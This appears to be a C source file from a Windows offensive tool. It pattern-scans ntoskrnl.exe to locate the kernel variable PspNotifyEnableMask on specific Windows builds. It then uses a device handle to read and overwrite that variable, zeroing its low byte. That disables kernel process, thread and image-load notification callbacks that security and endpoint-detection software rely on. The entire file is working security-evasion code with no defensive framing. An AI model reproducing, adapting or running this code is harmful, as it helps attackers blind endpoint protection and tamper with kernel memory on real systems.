#include "struct.h"

UCHAR PTRN_W10_1809_EnableMask[] = { 0x45,0x8b,0xef,0x41,0xc1,0xec,0x02,0x41,0x83,0xe4,0x01 };

void InitEnableMask(PINFORMATION pInfor)
{
	switch (pInfor->Build)
	{
		case 17763:
		case 22000:
		case 22623:
			pInfor->Notify.ModuleName = "ntoskrnl.exe";
			pInfor->Notify.Pattern = PTRN_W10_1809_EnableMask;
			pInfor->Notify.dwPattern = sizeof(PTRN_W10_1809_EnableMask);
			pInfor->Notify.offset = -14;
			pInfor->Notify.startFunc = "RtlEqualUnicodeString";
			pInfor->Notify.endFunc = "IoSetShareAccess";
			break;
	default:
		break;
	}
}

void PspNotifyEnableMask(PINFORMATION pInfor)
{
	NTSTATUS status;
	LONG_PTR PspNotifyEnableMaskAddr = 0;
	ULONG_PTR EnableMask = 0;

	InitEnableMask(pInfor);

	if (!moduleInfos)
	{
		status = enumDriver();
		if (!NT_SUCCESS(status))
		{
			PRINT_ERROR(L"enumDriver %08x\n", status);
			return;
		}
	}

	if (needSort)
		SortDevice();
	
	if (GetGlobalAddress(pInfor->Notify.ModuleName, pInfor->Notify.startFunc, pInfor->Notify.endFunc, pInfor->Notify.Pattern, pInfor->Notify.dwPattern, pInfor->Notify.offset, &PspNotifyEnableMaskAddr))
	{
		wprintf(L"[*] PspNotifyEnableMask @ %I64X\n", PspNotifyEnableMaskAddr);

		if (UtilReadKernelMemory(pInfor->hDevice, PspNotifyEnableMaskAddr, &EnableMask))
		{
			wprintf(L"[*] PspNotifyEnableMask Value: %02x\n", (BYTE)(EnableMask & 0xFF));
			EnableMask &= ~(ULONG_PTR)0xFF;
			UtilWriteKernelMemory(pInfor->hDevice, PspNotifyEnableMaskAddr, EnableMask);
		}

		/*if (RtReadKernelMemory(pInfor->hDevice, PspNotifyEnableMaskAddr, 4, &out))
		{
			wprintf(L"%02x\n", out);
		}*/

	}
	

}
